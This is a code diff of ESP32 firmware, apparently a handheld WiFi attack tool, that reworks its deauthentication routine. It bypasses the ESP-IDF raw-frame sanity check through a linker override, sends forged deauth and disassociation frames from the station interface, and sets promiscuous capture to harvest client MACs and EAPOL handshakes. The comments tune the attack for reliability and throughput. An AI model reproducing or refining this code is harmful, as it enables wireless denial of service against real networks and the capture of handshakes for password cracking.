@@ -47,80 +47,69 @@ extern "C" {
  * Returns ESP_OK on success. On failure the caller should abort the
  * feature — TX will not work.
  */
-/* Bruce's fallback (non-enhanced) deauth path: spin up a real softAP
- * on the target channel, then TX on WIFI_IF_AP. This is the pattern
- * that actually transmits on stock IDF 5.5 libs where the subtype
- * filter in libnet80211.a rejects STA-mode mgmt TX. Including Bruce's
- * lib-builder "patched" variants, the filter is still active on
- * STA + promiscuous — but WITH a real AP running, TX on WIFI_IF_AP
- * slips through (AP is authorized to send deauth to its own clients).
+/* Pure STA + raw-TX pattern (Porkchop-style — see
+ * github.com/0ct0sec/M5PORKCHOP/src/core/wsl_bypasser.cpp). Linker
+ * override in src/features/wifi_sanity_override.cpp nulls out
+ * ieee80211_raw_frame_sanity_check, so deauth/disassoc frames TX
+ * cleanly on WIFI_IF_STA without needing softAP authorization.
  *
- * Side-effect: a hidden AP briefly exists on the target channel.
- * Marauder users have shipped this for years. */
-/* Interface-MAC spoof is retained as a no-op shim for call sites that still
- * invoke it. Spoofing the softAP interface's MAC caused ieee80211_hostap_attach
- * to null-deref (esp_wifi_stop → set_mac → esp_wifi_start runs BEFORE the AP
- * config is set by WiFi.softAP, so the hostap attach path reads empty config
- * and crashes). Bruce, Marauder, and Ghost ESP all skip interface-MAC spoofing
- * and rely on addr2 in the frame bytes (which _deauth_build already sets to
- * the target BSSID). That's the working pattern — we do the same now. */
+ * Why this beats the old per-hop softAP pattern:
+ *   - softAP teardown/rebuild every hop thrashed the AP TX buffer
+ *     pool → ESP_ERR_NO_MEM (257) on >50% of frames
+ *   - APSTA mode doubles WiFi static + dynamic buffers → ~30 KB extra
+ *     heap pressure → eventual "Arduino Event Malloc Failed" crash
+ *   - WiFi.softAP attach races esp_wifi_start → LoadProhibited 0x2c
+ *     null-deref under heap pressure
+ *
+ * Now: WIFI_STA stays up across the whole session. silent_ap_begin
+ * just sets channel + promiscuous filter (once); silent_ap_end is
+ * essentially a no-op kept for source compat with existing callers. */
 static inline void wifi_silent_ap_set_source_mac(const uint8_t *mac) { (void)mac; }
 
 static inline esp_err_t wifi_silent_ap_begin(uint8_t channel)
 {
     if (!channel) channel = 1;
 
-    /* APSTA instead of AP-only. Reason: c5_begin() at boot brings up
-     * ESP-NOW on the STA interface for the TRIDENT HELLO listener. If
-     * we switch to AP-only the STA interface is destroyed and ESP-NOW
-     * TX starts returning ESP_ERR_NO_MEM (257) because its internal
-     * buffer pool can't find an egress interface. APSTA keeps both
-     * active — AP for our deauth bursts, STA for ESP-NOW. */
-    WiFi.mode(WIFI_AP_STA);
-    delay(10);
-
-    /* Random-ish SSID to avoid collisions. Keep it hidden. softAP sets the AP
-     * config and brings the radio up for raw TX on WIFI_IF_AP. */
-    char ssid[16];
-    snprintf(ssid, sizeof(ssid), "P%04X", (unsigned)(esp_random() & 0xFFFF));
-    if (!WiFi.softAP(ssid, "", channel, /*hidden*/ 1, /*max_conn*/ 4, /*ftm_responder*/ false)) {
-        Serial.println("[deauth] softAP start failed");
-        return ESP_FAIL;
+    /* Make sure we're in STA mode. Query the actual driver via the
+     * IDF API — Arduino's WiFi.getMode() returns a CACHED value that
+     * goes stale when WiFi was init'd via raw esp_wifi_init() (e.g.
+     * Triton's lean init). If we call Arduino's WiFi.mode() on a
+     * stale-OFF cache, it re-tries esp_netif_create_default_wifi_sta
+     * and asserts because the netif already exists. */
+    wifi_mode_t mode_now = WIFI_MODE_NULL;
+    esp_wifi_get_mode(&mode_now);
+    if (mode_now != WIFI_MODE_STA) {
+        esp_wifi_set_mode(WIFI_MODE_STA);
+        delay(20);
     }
 
-    /* Promiscuous on top of AP lets our client-sniffer callback run while
-     * the AP is the authorized TX source for deauth frames.
-     *
-     * Filter is MGMT + DATA + DATA_AMPDU — FILTER_MASK_ALL includes
-     * CTRL (ACK/RTS/CTS) which on a busy channel floods the shared
-     * WiFi buffer pool and starves the TX queue. Every
-     * esp_wifi_80211_tx then returns ESP_ERR_NO_MEM (257) with no
-     * frames landing on air. MGMT finds associations/EAPOL; DATA +
-     * DATA_AMPDU both needed to harvest STA MACs — modern APs (any
-     * 802.11n AP) aggregate data frames and without DATA_AMPDU the
-     * sniffer sees almost no client traffic (sta count stays at 0).
-     * See prior commit 0f8e9a5 — dropping AMPDU also drops EAPOL.
-     * This combo is the sweet spot: catches traffic without flooding. */
-    wifi_promiscuous_filter_t filter = {
-        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT
-                     | WIFI_PROMIS_FILTER_MASK_DATA
-                     | WIFI_PROMIS_FILTER_MASK_DATA_AMPDU
+    /* Promiscuous filter = ALL (Porkchop's setting). Our earlier comment
+     * claimed FILTER_MASK_ALL "floods the buffer pool and starves TX"
+     * but that was masking the real bug (the softAP TX pool was the
+     * culprit, not the promisc RX queue). CTRL frames are short, static
+     * RX buffer count gates RX memory, and Porkchop runs ALL stably with
+     * higher capture rates than our previous combo. */
+    /* Explicit MASK_ALL — passing nullptr to esp_wifi_set_promiscuous_filter
+     * on IDF 5.5 disables the filter outright on some builds (capture
+     * goes dead), not "reset to ALL" as the older docs implied. */
+    static const wifi_promiscuous_filter_t s_all_filter = {
+        .filter_mask = WIFI_PROMIS_FILTER_MASK_ALL
     };
-    esp_wifi_set_promiscuous_filter(&filter);
+    esp_wifi_set_promiscuous_filter(&s_all_filter);
     esp_wifi_set_promiscuous(true);
     esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
-    esp_wifi_set_max_tx_power(78);
-
-    delay(20);
+    /* esp_wifi_set_max_tx_power removed — Evil-Cardputer never sets
+     * it per-burst and runs stably. Per-burst toggling could put the
+     * driver into a flaky state mid-session. If caller wants max
+     * power, set it ONCE at session entry, not here. */
     return ESP_OK;
 }
 
 static inline void wifi_silent_ap_end(void)
 {
-    esp_wifi_set_promiscuous(false);
-    WiFi.softAPdisconnect(true);
-    WiFi.mode(WIFI_STA);
-    delay(50);
+    /* No-op in the STA-only pattern. softAP isn't running so there's
+     * nothing to tear down. Callers that previously rearmed promisc
+     * after this no longer need to — we never disabled it. */
 }
 
 /*
@@ -185,10 +174,34 @@ static inline int wifi_deauth_pair(const uint8_t dst[6],
 
     int ok = 0;
     esp_err_t r;
-    r = esp_wifi_80211_tx(WIFI_IF_AP, ap_to_sta_deauth, 26, false); if (r == ESP_OK) ok++;
-    r = esp_wifi_80211_tx(WIFI_IF_AP, ap_to_sta_dis, 26, false); if (r == ESP_OK) ok++;
-    r = esp_wifi_80211_tx(WIFI_IF_AP, sta_to_ap_deauth, 26, false); if (r == ESP_OK) ok++;
-    r = esp_wifi_80211_tx(WIFI_IF_AP, sta_to_ap_dis, 26, false); if (r == ESP_OK) ok++;
+    /* TX on WIFI_IF_STA — the linker override in wifi_sanity_override.cpp
+     * makes raw deauth/disassoc subtypes pass the kernel sanity check.
+     * Previously we used WIFI_IF_AP because the override wasn't in place
+     * and only an authorized AP could TX mgmt frames. Now that the check
+     * is bypassed, STA-interface TX is way more memory-efficient (single
+     * mode, no AP TX pool churn). */
+    /* 2 ms vTaskDelay between each frame — beacon_spam's working
+     * pattern. Without spacing, the 4 back-to-back TXs all queue into
+     * the dynamic_tx_buf pool simultaneously; if any prior TX is still
+     * waiting for an ACK/timeout the DMA buffer isn't released yet and
+     * subsequent calls return ESP_ERR_NO_MEM (257) — exactly what
+     * Triton was hitting. 2 ms is enough to let the prior frame drain
+     * but doesn't measurably reduce deauth aggression (still 4 frames
+     * within 8 ms vs 0 ms previous). */
+    r = esp_wifi_80211_tx(WIFI_IF_STA, ap_to_sta_deauth, 26, false); if (r == ESP_OK) ok++;
+    vTaskDelay(pdMS_TO_TICKS(2));
+    r = esp_wifi_80211_tx(WIFI_IF_STA, ap_to_sta_dis, 26, false); if (r == ESP_OK) ok++;
+    vTaskDelay(pdMS_TO_TICKS(2));
+    r = esp_wifi_80211_tx(WIFI_IF_STA, sta_to_ap_deauth, 26, false); if (r == ESP_OK) ok++;
+    vTaskDelay(pdMS_TO_TICKS(2));
+    r = esp_wifi_80211_tx(WIFI_IF_STA, sta_to_ap_dis, 26, false); if (r == ESP_OK) ok++;
+
+    /* Expose the last rc so feature UIs can display it on-screen
+     * instead of requiring the user to attach a serial monitor.
+     * Defined in wifi_sanity_override.cpp (already a TU we compile
+     * for the linker trick). */
+    extern volatile int wifi_deauth_last_rc;
+    wifi_deauth_last_rc = (int)r;
 
     if (ok == 0) {
         static uint32_t last_err_log = 0;
